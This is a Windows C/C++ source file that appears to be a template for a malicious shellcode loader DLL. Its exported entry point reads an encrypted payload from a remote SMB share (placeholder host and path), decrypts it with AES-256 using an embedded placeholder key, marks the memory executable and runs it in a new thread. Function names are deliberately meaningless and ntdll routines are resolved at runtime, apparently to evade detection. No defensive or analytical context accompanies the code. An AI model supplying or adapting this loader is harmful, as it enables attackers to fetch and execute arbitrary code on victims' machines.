#include <windows.h>
#include <winternl.h>
#include <wchar.h>
#include <winternl.h>
#include <winbase.h>
#include <winnt.h>
#include <fileapi.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

typedef NTSTATUS(WINAPI* _NtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType);

typedef NTSTATUS(WINAPI* _NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);

typedef NTSTATUS(WINAPI* _NtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN LPVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN LPTHREAD_START_ROUTINE StartAddress,
    IN LPVOID Parameter,
    IN BOOL CreateSuspended,
    IN ULONG StackZeroBits,
    IN ULONG SizeOfStackCommit,
    IN ULONG SizeOfStackReserve,
    OUT LPVOID BytesBuffer);

typedef NTSTATUS(WINAPI* _NtWaitForSingleObject)(
    HANDLE ObjectHandle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout);

typedef NTSTATUS(WINAPI* _NtClose)(
    HANDLE Handle);

DWORD WINAPI ThreadFunction(LPVOID lpParameter);

void PrintError(const wchar_t* action) {}

BOOL Random1(LPCWSTR szServer, LPCWSTR szFilePath, PBYTE* binaryData, SIZE_T* binarySize) {
    BOOL operationSuccess = TRUE;
    PBYTE allocatedMemory = NULL;

    WCHAR szFullUNCPath[MAX_PATH];
    swprintf_s(szFullUNCPath, MAX_PATH, L"\\\\%s\\%s", szServer, szFilePath);

    HANDLE hFile = CreateFileW(szFullUNCPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        operationSuccess = FALSE;
    }
    else {
        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize == INVALID_FILE_SIZE) {
            operationSuccess = FALSE;
        }
        else {
            SIZE_T allocationSize = fileSize;

            _NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
            NTSTATUS status = pNtAllocateVirtualMemory(
                GetCurrentProcess(),
                (PVOID*)&allocatedMemory,
                0,
                &allocationSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE);

            if (!NT_SUCCESS(status)) {
                operationSuccess = FALSE;
            }
            else {
                DWORD bytesRead;
                if (!ReadFile(hFile, allocatedMemory, fileSize, &bytesRead, NULL)) {
                    operationSuccess = FALSE;
                }

                *binaryData = allocatedMemory;
                *binarySize = bytesRead;
            }
        }

        CloseHandle(hFile);
    }

    return operationSuccess;
}

BOOL Random2(const PBYTE BinaryData, SIZE_T DataSize) {
    LPVOID pMemory = VirtualAlloc(NULL, DataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pMemory == NULL) {
        return FALSE;
    }

    memcpy(pMemory, BinaryData, DataSize);

    _NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtProtectVirtualMemory");
    SIZE_T regionSize = DataSize;
    ULONG oldProtect;
    NTSTATUS status = pNtProtectVirtualMemory(
        GetCurrentProcess(),
        &pMemory,
        &regionSize,
        PAGE_NOACCESS,
        &oldProtect);

    if (!NT_SUCCESS(status)) {
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    status = pNtProtectVirtualMemory(
        GetCurrentProcess(),
        &pMemory,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect);

    if (!NT_SUCCESS(status)) {
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    HANDLE hThread = CreateThread(NULL, 0, ThreadFunction, pMemory, CREATE_SUSPENDED, NULL);
    if (hThread == NULL) {
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    ULONG suspendCount = ResumeThread(hThread);
    if (suspendCount == (DWORD)-1) {
        CloseHandle(hThread);
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    _NtClose pNtClose = (_NtClose)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtClose");
    status = pNtClose(hThread);

    _NtFreeVirtualMemory pNtFreeVirtualMemory = (_NtFreeVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtFreeVirtualMemory");
    status = pNtFreeVirtualMemory(
        GetCurrentProcess(),
        &pMemory,
        &regionSize,
        MEM_RELEASE);

    return TRUE;
}

DWORD WINAPI ThreadFunction(LPVOID lpParameter) {
    PBYTE BinaryData = (PBYTE)lpParameter;
    typedef void (*FunctionPointer)();
    FunctionPointer pFunction = (FunctionPointer)BinaryData;

    pFunction();

    return 0;
}

int Random3(char* Random4, unsigned int Random5, char* Random6, size_t Random6len) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)Random6, (DWORD)Random6len, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, Random4, &Random5)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

char Random7[] = KEYVALUE

extern "C" void CALLBACK ENTRYPOINT(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
    LPCWSTR szServer = L"HOSTNAME";
    LPCWSTR szFilePath = L"SHAREFOLDER\\SHELLCODEFILE";

    PBYTE Random8;
    SIZE_T Random8Size;

    BOOL success = Random1(szServer, szFilePath, &Random8, &Random8Size);

    if (success) {
        Random3((char*)Random8, Random8Size, Random7, sizeof(Random7));

        success = Random2(Random8, Random8Size);

        _NtFreeVirtualMemory pNtFreeVirtualMemory = (_NtFreeVirtualMemory)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtFreeVirtualMemory");
        SIZE_T regionSize = Random8Size;
        NTSTATUS status = pNtFreeVirtualMemory(
            GetCurrentProcess(),
            (PVOID*)&Random8,
            &regionSize,
            MEM_RELEASE);

        LocalFree(Random8);
    }

    return success ? 0 : 1;
}

